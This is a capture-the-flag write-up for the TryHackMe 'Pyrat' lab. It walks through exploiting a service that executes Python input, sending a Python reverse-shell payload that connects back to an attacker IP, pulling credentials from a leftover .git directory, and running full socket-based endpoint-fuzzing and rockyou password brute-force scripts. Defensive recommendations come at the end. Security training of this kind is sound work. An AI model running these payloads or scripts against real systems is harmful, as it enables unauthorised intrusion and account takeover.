# Pyrat — TryHackMe Write-up
This write-up documents an investigation and exploit path for the Pyrat TryHackMe machine. It integrates the public walkthrough (used as reference) and the local helper scripts in this workspace. The steps are written as a concise, reproducible guide and include the scripts used for endpoint fuzzing and password brute forcing.

---

## Task
Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.

---

## Overview

- Target (lab): Pyrat web service listening on port 8000.
- Key observation: the server appears to interpret plain text input as Python code — a Python code execution (RCE) vector.
- Goal: obtain user shell, find user flag, then escalate to root and retrieve root flag.

High-level steps taken:
1. Local setup (hosts entry)
2. Port/service enumeration (nmap/rustscan)
3. Confirm Python code execution by interacting over TCP (nc/netcat)
4. Use a Python reverse-shell payload to spawn an interactive shell
5. Post-exploitation: enumeration, run LinPEAS, inspect a Git repo for secrets
6. Use the discovered credentials to SSH as a user
7. Fuzz endpoints to discover admin endpoints and brute-force admin password
8. Use admin access to get root and read the root flag

---

## 0 — Local setup

Add an /etc/hosts entry when working with the lab hostname (optional if using the IP directly):

```
# /etc/hosts
10.49.156.2    pyrat.thm
```

This allows `http://pyrat.thm:8000` or `nc pyrat.thm 8000` to be used instead of the IP.

---

## 1 — Enumeration

Run a port scan to identify open services:

```
nmap -sC -sV -oN 10.49.156.2
```

Typical findings for this box include:
- OpenSSH on 22
- HTTP-like service on 8000 (SimpleHTTP / Python)

The service on 8000 returns unusual messages such as name 'GET' is not defined or "Try a more basic connection" which hinted that it treats the input as Python rather than an HTTP request.

---

## 2 — Confirm Python code execution

Connect with netcat (nc) and try sending Python code, e.g.:

```
nc pyrat.thm 8000
print("Hello")
```

If the server evaluates the input as Python, you'll see the print output or Python error messages like `name 'Hello' is not defined` for unquoted tokens. This confirms an RCE vector — the service executes Python expressions sent over the TCP socket.

With this behaviour we can feed it a reverse shell payload to get an interactive shell.

---

## 3 — Reverse shell 

From your attacker machine:

1. Start a listener:

```
nc -lvnp 1234
```

2. Send a Python reverse-shell payload through nc (escaping/single-line formatting required). A compact payload that works when executed by Python:

```
import socket,os,pty;s=socket.socket();s.connect(("10.49.156.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```

After sending the payload, you should receive a shell on the listener. Upgrade the shell for usability with:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg
```

---

## 4 — Post-exploitation and enumeration

After getting a shell (often as `www-data`):

- Check `whoami`, `id`, `pwd`.
- Run `linpeas.sh` (or the version you downloaded) to enumerate potential privilege escalation vectors.
- Inspect common locations for sensitive files: `/opt`, `/var`, `/home`.

In this particular box a `.git` directory under `/opt/dev/.git` contained useful information (commit messages, config) including credentials.

---

## 5 — Investigate the Git repo for secrets

If you find a `.git` directory, recover source and history using git commands or tools that extract files from the `.git` directory. Look for recent commits and configuration files. In this engagement, `COMMIT_EDITMSG` referenced a "shell endpoint" and the `config` contained credentials (username and password) which proved useful to SSH into the machine.

Example commands when on the host with access to the repo:

```
cd /opt/dev/.git
cat COMMIT_EDITMSG
cat config
# or reconstruct the working tree with git commands if git is present
```

---

## 6 — SSH into the discovered user

With credentials found in the repo, you can SSH to the target as the discovered user:

```
ssh think@10.49.156.2
# password: _TH1NKINGPirate$_ (example from repo)
```

Then read the `user.txt` in the user home:

```
cat /home/think/user.txt
```

(Replace with the actual file names/flags in your investigation.)

---

## 7 — Fuzz endpoints and crack the admin password using the local scripts

Two small helper scripts in this workspace automate common tasks: endpoint fuzzing and password fuzzing.

### fuzzing.py

This script (workspace file `fuzzing.py`) iterates a wordlist and sends values to the service over TCP. It detects responses that are not standard "is not defined" errors.

Key points in `fuzzing.py`:
- Connects to host `pyrat.thm` on port `8000`.
- Sends each line from `directory-list-2.3-medium.txt` followed by a newline.
- Prints responses that look interesting (non-empty and not the usual "not defined" message).

(Contents of `fuzzing.py` in your workspace)

```python
import socket

host = "pyrat.thm"
port = 8000

wordlist = "directory-list-2.3-medium.txt"

def fuzz_endpoint(wordlist):
    try:
        with open(wordlist, 'r') as file:
            for line in file:
                command = line.strip()

                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((host, port))
                    s.sendall(command.encode() + b'\n')
                    response = s.recv(1024).decode().strip()

                    if response != "" and "is not defined" not in response and "leading zero" not in response:
                        print(f"Sent: {command} | Received: {response}")
    except FileNotFoundError:
        print(f"Wordlist file not found: {wordlist}")
    except Exception as e:
        print(f"An error occurred: {e}")

fuzz_endpoint(wordlist)
```

Usage (run locally from attacker machine):

```
python3 fuzzing.py
```

This helps find endpoints such as `shell`, `admin`, and others. In practice this revealed that the `shell` endpoint opens a shell and the `admin` endpoint prompted for a password.

### password.py (password fuzzing)

This script (`password.py`) attempts to brute-force an admin password by sending `admin` then iterating through a password wordlist (the script in the workspace uses `/usr/share/wordlists/rockyou.txt`).

(Contents of `password.py` in your workspace)

```python
import socket
import sys

host = "pyrat.thm"
port = 8000

password_wordlist = "/usr/share/wordlists/rockyou.txt"

def fuzz_passwords(wordlist):
    try:
        with open(wordlist, 'r') as file:
            for line in file:
                password = line.strip()

                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((host, port))
                    s.sendall(b'admin\n')
                    response = s.recv(1024).decode().strip()

                    if "password" in response.lower():
                        s.sendall((password + '\n').encode())
                        response = s.recv(1024).decode().strip()

                        if "password:" in response.lower():
                            continue
                        else:
                            print(f"Password found: {password}")
                            break
                    else:
                        print("Unexpected response after sending username. Exiting.")
                        break
    except FileNotFoundError:
        print(f"Wordlist file not found: {wordlist}")
    except Exception as e:
        print(f"An error occurred: {e}")

fuzz_passwords(password_wordlist)
```

Usage:

```
# test with a small custom wordlist first
python3 password.py
```

Note: Brute forcing against live services should only be performed in lab/authorized environments. The workspace scripts expect `pyrat.thm` host mapping (or replace with the IP and adjust timeouts/handling if needed).

---

## 8 — Getting admin and root

- With the admin password found by the script (e.g., `abc123` as in the public walkthrough), reconnect and send the `admin` command and the password. The `admin` endpoint may reveal a privileged shell.
- Use standard privilege escalation techniques: linpeas findings, exposed credentials, SUID binaries, misconfigured scripts, or sudoers entries.

In the referenced walkthrough the root flag was found after exploiting the `admin` endpoint and escalating privileges.

---

## Findings & Recommendations

- The web service executes user-supplied input as Python code — this is a critical RCE vulnerability. Never evaluate or execute untrusted input.
- Sensitive data in a `.git` repository on a server can leak credentials. Avoid leaving `.git` directories on production machines or ensure they are not accessible by untrusted users.
- Admin interfaces protected by weak passwords are vulnerable to wordlist attacks — enforce strong passwords and account lockouts.
- Monitoring and logging would detect suspicious repeated connection attempts or unusual activity.

Recommendations summary:
- Patch the code to never exec untrusted input. Use safe parsing and input validation.
- Remove or secure sensitive data from Git repositories on servers.
- Implement strong authentication and rate-limiting on admin endpoints.
- Run regular security audits and automated scanning.

